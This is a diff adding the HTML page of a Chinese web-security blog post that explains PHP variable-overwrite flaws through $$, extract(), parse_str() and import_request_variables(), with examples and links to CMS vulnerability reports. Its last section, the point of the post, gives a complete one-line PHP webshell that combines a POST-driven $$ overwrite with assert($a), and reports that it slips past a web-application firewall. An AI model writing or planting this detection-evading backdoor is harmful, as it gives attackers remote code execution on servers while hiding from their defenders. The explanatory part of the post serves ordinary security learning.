@@ -1,0 +1,1216 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/fav.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="奇淫技巧,过狗," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Yunen's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="一、发生条件：函数使用不当（$$、extract()、parse_str()、import_request_variables()等）开启全局变量 二、基础了解：1.$$定义$$代表可变变量，就是说，一个变量的变量名可以动态的设置和使用。">
+<meta name="keywords" content="奇淫技巧,过狗">
+<meta property="og:type" content="article">
+<meta property="og:title" content="变量覆盖漏洞学习及在webshell中的运用">
+<meta property="og:url" content="http://www.0x002.com/2018/变量覆盖漏洞学习及在webshell中的运用/index.html">
+<meta property="og:site_name" content="Yunen&#39;s Blog">
+<meta property="og:description" content="一、发生条件：函数使用不当（$$、extract()、parse_str()、import_request_variables()等）开启全局变量 二、基础了解：1.$$定义$$代表可变变量，就是说，一个变量的变量名可以动态的设置和使用。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2018/07/09/5b426fdad38e1.png">
+<meta property="og:image" content="https://i.loli.net/2018/07/09/5b426fdad38a9.png">
+<meta property="og:image" content="https://i.loli.net/2018/07/09/5b426fdadac53.png">
+<meta property="og:image" content="https://i.loli.net/2018/07/09/5b426fdadac1e.png">
+<meta property="og:image" content="https://i.loli.net/2018/07/09/5b426fdae279d.png">
+<meta property="og:image" content="https://i.loli.net/2018/07/09/5b426fdae96e7.png">
+<meta property="og:image" content="https://i.loli.net/2018/07/09/5b426fdb04b50.png">
+<meta property="og:image" content="https://i.loli.net/2018/07/09/5b426fdb03b70.png">
+<meta property="og:image" content="https://i.loli.net/2018/07/09/5b426fdb03bfc.png">
+<meta property="og:image" content="https://i.loli.net/2018/07/09/5b426fdb06bb0.png">
+<meta property="og:updated_time" content="2018-10-27T16:25:43.668Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="变量覆盖漏洞学习及在webshell中的运用">
+<meta name="twitter:description" content="一、发生条件：函数使用不当（$$、extract()、parse_str()、import_request_variables()等）开启全局变量 二、基础了解：1.$$定义$$代表可变变量，就是说，一个变量的变量名可以动态的设置和使用。">
+<meta name="twitter:image" content="https://i.loli.net/2018/07/09/5b426fdad38e1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Yunen'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.0x002.com/2018/变量覆盖漏洞学习及在webshell中的运用/"/>
+
+
+
+
+
+  <title>变量覆盖漏洞学习及在webshell中的运用 | Yunen's Blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?33ecfad176b3600bd31dce47459394e6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Yunen's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Focus On Web Safety!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />
+            
+            读书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-project">
+          <a href="/project/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-file"></i> <br />
+            
+            项目
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.0x002.com/2018/变量覆盖漏洞学习及在webshell中的运用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Yunen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://q4.qlogo.cn/headimg_dl?dst_uin=2865859175&spec=100">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yunen's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">变量覆盖漏洞学习及在webshell中的运用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-09T03:52:15+08:00">
+                2018-07-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/原创栏目/" itemprop="url" rel="index">
+                    <span itemprop="name">原创栏目</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="一、发生条件："><a href="#一、发生条件：" class="headerlink" title="一、发生条件："></a>一、发生条件：</h2><p>函数使用不当（$$、extract()、parse_str()、import_request_variables()等）<br>开启全局变量</p>
+<h2 id="二、基础了解："><a href="#二、基础了解：" class="headerlink" title="二、基础了解："></a>二、基础了解：</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1.$$定义"></a>1.$$定义</h3><p>$$代表可变变量，就是说，一个变量的变量名可以动态的设置和使用。<br><a id="more"></a><br>举个简单例子：<br> <img src="https://i.loli.net/2018/07/09/5b426fdad38e1.png" alt=""><br>变量a被定义成了字符串hello 而变量$a被定于成了字符串world!<br>但同时$a本身也是个变量<br>$$a就可以代表两个含义$($a)和$(hello) 两个变量<br>此时输出的结果如图：<br><img src="https://i.loli.net/2018/07/09/5b426fdad38a9.png" alt=""></p>
+<h3 id="2-extract-定义"><a href="#2-extract-定义" class="headerlink" title="2.extract()定义"></a>2.extract()定义</h3><p>extract()可以从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值<br>语法结构：extract(array,extract_rules,prefix)<br>i.array为必选参数（此参数必须为数组型数据）<br>ii.extract_rules为可选参数，可选的值有：<br>● EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。<br>● EXTR_SKIP - 如果有冲突，不覆盖已有的变量。<br>● EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。<br>● EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。<br>● EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。<br>● EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。<br>● EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。<br>● EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。<br>iii.prefix为可选参数（此参数暂不解释）<br>举个例子：<br> <img src="https://i.loli.net/2018/07/09/5b426fdadac53.png" alt=""><br>在开头我们定义了一个数组d<br>然后我们使用extract()函数并将array参数填写为数组d<br>此时数组d中的键名将当做新的变量名来创建一个新的变量，而新的变量的值即为在数组中对应的值。（注意如果之前有声明过同一个变量,那么该变量将被覆盖。如果之后才声明将不会出现变量覆盖的现象）<br>此时输出结果为：<br> <img src="https://i.loli.net/2018/07/09/5b426fdadac1e.png" alt=""><br>可以看到我们之前并未声明过a、b、c变量，但是仍可输出。</p>
+<h3 id="3-parse-str-定义："><a href="#3-parse-str-定义：" class="headerlink" title="3.parse_str()定义："></a>3.parse_str()定义：</h3><p>把查询字符串解析到变量中<br>语法：parse_str(string,array)<br>string为必选参数<br>array为可选参数<br>举个例子<br> <img src="https://i.loli.net/2018/07/09/5b426fdae279d.png" alt=""><br>可以看到此函数将name和age初始化成了变量，且值为等号右边的值<br>当array参数存在时：<br> <img src="https://i.loli.net/2018/07/09/5b426fdae96e7.png" alt=""><br>4.import_request_varibles()定义<br>将 GET/POST/Cookie 变量导入到全局作用域中<br>此函数相当于开启全局变量注册<br>语法import_request_variables(string $types ,string $prefix )<br>第一个参数为必选<br>第二个参数为可选<br>例子：<br>import_request_variables(“GPC”)<br>使用此方法即可开启对_POST、_GET、_COOKIE的全局变量注册<br>当第二个参数存在时将会加上一个前缀</p>
+<h2 id="三、经典案例"><a href="#三、经典案例" class="headerlink" title="三、经典案例"></a>三、经典案例</h2><h3 id="1-经典-变量覆盖"><a href="#1-经典-变量覆盖" class="headerlink" title="1.经典$$变量覆盖"></a>1.经典$$变量覆盖</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $_request) &#123;</span><br><span class="line">    foreach($$_request as $_key =&gt; $_value) &#123;</span><br><span class="line">        $$_key = addslashes($_value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这是一段非常经典的$$注册变量导致的变量覆盖代码，很多应用上都出现过<br>可以看出$_key为COOKIE POST GET中的参数<br>比如提交?a=1 则$_key的值为a<br>而下面的$$_key则会有$a的意思，结合起来就变成了$a = addslashes($_value)<br>这样便会覆盖原有的变量a的值<br>我们来运行一下：<br> <img src="https://i.loli.net/2018/07/09/5b426fdb04b50.png" alt=""><br>可以看到变量a被我们覆盖掉了</p>
+<h3 id="2-部分cms变量覆盖案例："><a href="#2-部分cms变量覆盖案例：" class="headerlink" title="2.部分cms变量覆盖案例："></a>2.部分cms变量覆盖案例：</h3><p>MetInfo全局变量覆盖另类突破防注入<br><a href="http://www.weixianmanbu.com/article/84.html" target="_blank" rel="noopener">http://www.weixianmanbu.com/article/84.html</a><br>齐博CMS变量覆盖导致sql注入漏洞<br><a href="http://bobao.360.cn/learning/detail/291.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/291.html</a><br>Destoon 20140530最新版超全局变量覆盖导致的安全问题<br><a href="http://0day5.com/archives/1855/" target="_blank" rel="noopener">http://0day5.com/archives/1855/</a></p>
+<h2 id="四、变量覆盖玩出新花样之一句话木马bypass某狗"><a href="#四、变量覆盖玩出新花样之一句话木马bypass某狗" class="headerlink" title="四、变量覆盖玩出新花样之一句话木马bypass某狗"></a>四、变量覆盖玩出新花样之一句话木马bypass某狗</h2><p>经过我们简单的测试，我们可以了解到：当我们使用assert函数时，如果函数的参数是可控，那么某狗拦截。例如:assert($_POST[a])或者$a=$_POST[c];assert($a)这些都是拦截<br> <img src="https://i.loli.net/2018/07/09/5b426fdb03b70.png" alt=""></p>
+<p>但是如果我们只有assert($a)这一句时，我们发现他就不会进行拦截了<br> <img src="https://i.loli.net/2018/07/09/5b426fdb03bfc.png" alt=""><br>这就值得我们思考了，为什么这样不会拦截呢？<br>我认为应该是某狗觉得这个变量a是不可控的，所以就认为这不是木马<br>那如果这时我们在联系一下变量覆盖漏洞呢？<br>在这里我选用了上面的案例代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $_request) &#123;</span><br><span class="line">    foreach($$_request as $_key =&gt; $_value) &#123;</span><br><span class="line">        $$_key = addslashes($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>把addslashes()删掉 然后把代码精简下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&apos;_POST&apos;) as $_r)&#123;foreach($$_r as $_k =&gt; $_v) &#123;$$_k = $_v;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>最终代码为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php foreach(array(&apos;_POST&apos;) as $_r)&#123;foreach($$_r as $_k =&gt; $_v) &#123;$$_k = $_v;&#125;&#125;;assert($a);?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>成功bypass<br> <img src="https://i.loli.net/2018/07/09/5b426fdb06bb0.png" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/奇淫技巧/" rel="tag"><i class="fa fa-tag"></i> 奇淫技巧</a>
+          
+            <a href="/tags/过狗/" rel="tag"><i class="fa fa-tag"></i> 过狗</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/[转]绕过360,安全狗,D盾等进行Sql注入/" rel="next" title="[转]绕过360,安全狗,D盾等进行Sql注入">
+                <i class="fa fa-chevron-left"></i> [转]绕过360,安全狗,D盾等进行Sql注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/读书笔记之espcms漏洞复现/" rel="prev" title="读书笔记之CMS漏洞复现集合">
+                读书笔记之CMS漏洞复现集合 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://q4.qlogo.cn/headimg_dl?dst_uin=2865859175&spec=100"
+                alt="Yunen" />
+            
+              <p class="site-author-name" itemprop="name">Yunen</p>
+              <p class="site-description motion-element" itemprop="description">Just A Websafe Lover!</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/HackerYunen" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="2865859175@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/yunen/" title="Yunen's cnblog" target="_blank">Yunen's cnblog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.safe6.cn/" title="Safe6's Blog" target="_blank">Safe6's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.lolpzili.com/" title="Lolpzili's Blog" target="_blank">Lolpzili's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.endereyewxy.com/" title="Endereye's Blog" target="_blank">Endereye's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.hackerdelort.com/" title="Delort's Blog" target="_blank">Delort's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.aisnnu.com/" title="Aisnnu's Blog" target="_blank">Aisnnu's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xhyeax.github.io/" title="Xhy's Blog" target="_blank">Xhy's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、发生条件："><span class="nav-number">1.</span> <span class="nav-text">一、发生条件：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、基础了解："><span class="nav-number">2.</span> <span class="nav-text">二、基础了解：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-定义"><span class="nav-number">2.1.</span> <span class="nav-text">1.$$定义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-extract-定义"><span class="nav-number">2.2.</span> <span class="nav-text">2.extract()定义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-parse-str-定义："><span class="nav-number">2.3.</span> <span class="nav-text">3.parse_str()定义：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、经典案例"><span class="nav-number">3.</span> <span class="nav-text">三、经典案例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-经典-变量覆盖"><span class="nav-number">3.1.</span> <span class="nav-text">1.经典$$变量覆盖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-部分cms变量覆盖案例："><span class="nav-number">3.2.</span> <span class="nav-text">2.部分cms变量覆盖案例：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、变量覆盖玩出新花样之一句话木马bypass某狗"><span class="nav-number">4.</span> <span class="nav-text">四、变量覆盖玩出新花样之一句话木马bypass某狗</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yunen</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
